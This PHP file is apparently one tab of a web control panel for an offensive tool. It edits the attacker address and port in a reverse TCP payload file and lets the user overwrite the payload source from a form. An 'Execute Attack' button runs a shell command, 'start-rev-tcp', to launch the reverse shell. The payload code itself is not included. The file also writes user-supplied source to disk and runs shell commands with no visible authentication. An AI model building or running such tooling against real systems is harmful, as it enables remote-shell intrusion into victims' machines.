<?php
	$values = array('address', 'port');
	if (isset($_POST['action']) && $_POST['action'] == 'update' && isset($_POST['tab']) && $_POST['tab'] == 'rtcppayload'):
		$con = file_get_contents($files['reversetcp']['path']);
		foreach ($values as $v):
			if (isset($_POST[$v])):
				$new_value = '$'.$v.' = \''.strip_tags(trim($_POST[$v]))."'";
				$con = preg_replace('/\$'.$v.' = \'([0-9\.]*)\'/', $new_value, $con);
			endif;
		endforeach;		
		file_put_contents($files['reversetcp']['path'], $con);
	elseif (isset($_POST['action']) && $_POST['action'] === 'updateSource' && isset($_POST['tab']) && $_POST['tab'] == 'rtcppayload'):
		$new_source = trim(strip_tags($_POST['source']));
		file_put_contents($files['reversetcp']['path'], $new_source);
	elseif (isset($_GET['action']) && $_GET['action'] === 'execute' && isset($_GET['tab']) && $_GET['tab'] == 'rtcppayload'):
		$res = shell_exec('start-rev-tcp');
		$message = 'Attack executed!';
	endif;
	$con = file_get_contents($files['reversetcp']['path']);
	foreach ($values as $v):
		$match = array();
		preg_match('/\$'.$v.' = \'([0-9\.]*)\'/', $con, $match );
		if (isset($match[1])):
			$$v = $match[1];
		else:
			$$v = '';
		endif;
	endforeach;
?>
<?php if (!empty($message)):?>
	<div class="alert alert-info" role="alert">
		<p><?php echo $message;?></p>
	</div>
<?php endif;?>
<ul class="nav nav-tabs" role="tablist">
	<li class="active"><a href="#rtcppayloadoptions" role="tab" data-toggle="tab">Options</a></li>
	<li class=""><a href="#rtcppayloadsource" role="tab" data-toggle="tab">Source</a></li>  				
</ul>
<div class="tab-content">
	<div id="rtcppayloadoptions" class="tab-pane fade in active">
		<form action="index.php#rtcppayload" method="POST">
			<input type="hidden" name="action" value="update" />
			<input type="hidden" name="tab" value="rtcppayload" />
			<input type="hidden" name="k" value="hid" />
			<?php foreach ($values as $v):?>
				<div class="form-group">
					<label for="input-<?php echo $v;?>"><?php echo $v;?></label>
					<input id="input-<?php echo $v;?>" class="form-control" type="text" name="<?php echo $v;?>" placeholder="<?php echo $v;?>" value="<?php echo $$v;?>" />
				</div>
			<?php endforeach;?>
			<input class="btn btn-primary btn-sm" type="submit" value="Update" name="commit">
			<a href="index.php?k=<?php echo $selected_k;?>&tab=rtcppayload&action=execute#rtcppayload"><input class="btn btn-success btn-sm" type="button" value="Execute Attack" name="commit"></a>
		</form>
	</div>
	<div id="rtcppayloadsource" class="tab-pane fade in">
		<form action="index.php#rtcppayload" method="POST">
			<input type="hidden" name="k" value="hid" />
			<input type="hidden" name="tab" value="rtcppayload" />
			<input type="hidden" name="action" value="updateSource" />
			<div class="form-group">		
				<textarea name="source" id="input-source" class="form-control panel-body md-input" rows="20"><?php echo $con;?></textarea>
			</div>
			<input class="btn btn-primary btn-sm" type="submit" value="Update source" name="commit">
		</form>
	</div>
</div> <!-- end of .tab-content -->
